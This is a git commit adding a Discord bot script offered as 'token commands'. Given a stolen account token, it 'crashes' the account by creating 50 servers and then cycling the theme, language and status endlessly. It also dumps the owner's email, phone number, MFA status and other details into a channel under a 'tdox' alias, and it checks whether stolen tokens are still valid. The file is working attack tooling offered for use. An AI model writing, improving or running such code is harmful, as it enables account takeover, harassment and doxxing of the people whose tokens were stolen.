f0bd613dc20bfae2f4cb72720a7d2cab7bded9d2
Xinez / <48367405+ExploitHax@users.noreply.github.com>
2022-02-05 22:55:13 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,273 @@
+import discord
+from discord.ext import commands
+from discord.ext.commands import Bot
+import asyncio
+import time
+import logging
+import random  
+from discord.ext import commands, tasks
+from random import choice
+import colorama
+from colorama import Fore, init
+import json
+import string
+import os
+import requests
+from datetime import date
+from itertools import cycle
+import os
+from discord.ext import commands, tasks
+from discord.ext.commands import Bot
+from discord import utils
+import datetime
+
+
+
+
+
+
+
+
+
+
+
+languages = {
+    'hu'    : 'Hungarian, Hungary',
+    'nl'    : 'Dutch, Netherlands',
+    'no'    : 'Norwegian, Norway',
+    'pl'    : 'Polish, Poland',
+    'pt-BR' : 'Portuguese, Brazilian, Brazil',
+    'ro'    : 'Romanian, Romania',
+    'fi'    : 'Finnish, Finland',
+    'sv-SE' : 'Swedish, Sweden',
+    'vi'    : 'Vietnamese, Vietnam',
+    'tr'    : 'Turkish, Turkey',
+    'cs'    : 'Czech, Czechia, Czech Republic',
+    'el'    : 'Greek, Greece',
+    'bg'    : 'Bulgarian, Bulgaria',
+    'ru'    : 'Russian, Russia',
+    'uk'    : 'Ukranian, Ukraine',
+    'th'    : 'Thai, Thailand',
+    'zh-CN' : 'Chinese, China',
+    'ja'    : 'Japanese',
+    'zh-TW' : 'Chinese, Taiwan',
+    'ko'    : 'Korean, Korea'
+}
+
+locales = [ 
+    "da", "de",
+    "en-GB", "en-US",
+    "es-ES", "fr",
+    "hr", "it",
+    "lt", "hu",
+    "nl", "no",
+    "pl", "pt-BR",
+    "ro", "fi",
+    "sv-SE", "vi",
+    "tr", "cs",
+    "el", "bg",
+    "ru", "uk",
+    "th", "zh-CN",
+    "ja", "zh-TW",
+    "ko"
+]
+
+m_numbers = [
+    ":one:",
+    ":two:", 
+    ":three:", 
+    ":four:", 
+    ":five:", 
+    ":six:"
+]
+
+m_offets = [
+    (-1, -1),
+    (0, -1),
+    (1, -1),
+    (-1, 0),
+    (1, 0),
+    (-1, 1),
+    (0, 1),
+    (1, 1)
+]
+
+
+
+
+
+client = commands.Bot(command_prefix='.')
+
+client.remove_command("help")
+
+
+
+
+
+
+
+
+
+@client.event
+async def on_ready():
+    colorama.init()
+    print(Fore.RED + """\
+
+Starting bot in corso
+
+                        
+
+
+
+
+
+""" + Fore.RESET)
+
+
+
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="to see the list of commands type .help | Powerd By NovaGriefing"))
+
+@client.event
+async def on_server_join(server):
+    print("Joining {0}".format(server.name))
+
+
+@client.command()
+async def help(ctx):
+    user = ctx.author
+    embed = discord.Embed(
+        title="**lightning Token Commands!**",
+        description=
+        "**.tokenfuck** = `crash an account token` \n"
+        "**.tokeninfo** = `shows information of an account token` \n"
+        "**.tokencheck** = `shows if a token is valid or no longer valid` \n"
+        "`Credit Zz_Simone_Xx ッ`\n",
+
+        colour=discord.Colour.dark_orange()
+    )
+
+    await user.send(embed=embed)
+    await ctx.send(f"{ctx.message.author.mention} `Commands sent in DM`")
+
+
+
+
+@client.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send(
+            ' Please Enter The Command Well'
+        )
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send(
+            " You Don'T Have Permission To Do This"
+        )
+
+
+
+
+@client.command(aliases=['tokenfucker', 'disable', 'crash']) 
+async def tokenfuck(ctx, _token): # b'\xfc' 
+    await ctx.message.delete()
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+        'Content-Type': 'application/json',
+        'Authorization': _token,
+    }
+    request = requests.Session()
+    payload = {
+        'locale': "ja",
+        'message_display_compact': False,
+        'inline_embed_media': False,
+        'inline_attachment_media': False,
+        'gif_auto_play': False,
+        'render_embeds': False,
+        'render_reactions': False,
+        'animate_emoji': False,
+        'convert_emoticons': False,
+        'enable_tts_command': False,
+        'explicit_content_filter': '0',
+        'status': "invisible"
+    }
+    guild = {
+        'channels': None,
+        'icon': None,
+        'name': "tokenfuck (lightning)",
+        'region': "europe"
+    } 
+    for _i in range(50):
+        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+    while True:
+        try:
+            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
+        else:
+            break
+    modes = cycle(["light", "dark"])
+    statuses = cycle(["online", "idle", "dnd", "invisible"])
+    while True:
+        setting = {
+            'theme': next(modes),
+            'locale': random.choice(locales),
+            'status': next(statuses)
+        }
+        while True:
+            try:
+                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
+            except Exception as e:
+                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
+            else:
+                break   
+
+@client.command(aliases=['tokinfo', 'tdox'])
+async def tokeninfo(ctx, _token): # b'\xfc'
+    await ctx.message.delete()
+    headers = {
+        'Authorization': _token,
+        'Content-Type': 'application/json'
+    }      
+    try:
+        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+        res = res.json()
+        user_id = res['id']
+        locale = res['locale']
+        avatar_id = res['avatar']
+        language = languages.get(locale)
+        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
+    except KeyError:
+        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
+    em = discord.Embed(
+        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
+    fields = [
+        {'name': 'Phone', 'value': res['phone']},
+        {'name': 'Flags', 'value': res['flags']},
+        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
+        {'name': 'MFA?', 'value': res['mfa_enabled']},
+        {'name': 'Verified?', 'value': res['verified']},
+    ]
+    for field in fields:
+        if field['value']:
+            em.add_field(name=field['name'], value=field['value'], inline=False)
+            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
+    return await ctx.send(embed=em)
+
+
+
+@client.command(aliases=["Check"])
+async def tokencheck(ctx, *, arg):
+	headers = {'Content-Type': 'application/json', 'authorization': arg}
+	url = 'https://discordapp.com/api/v6/users/@me/library'
+	re = requests.get(url, headers=headers)
+	if re.status_code == 200:
+		await ctx.send("Token is Valid!")
+	else:
+		await ctx.send("Token is Invalid!")
+
+
+
+
+
+
+
+client.run('token')
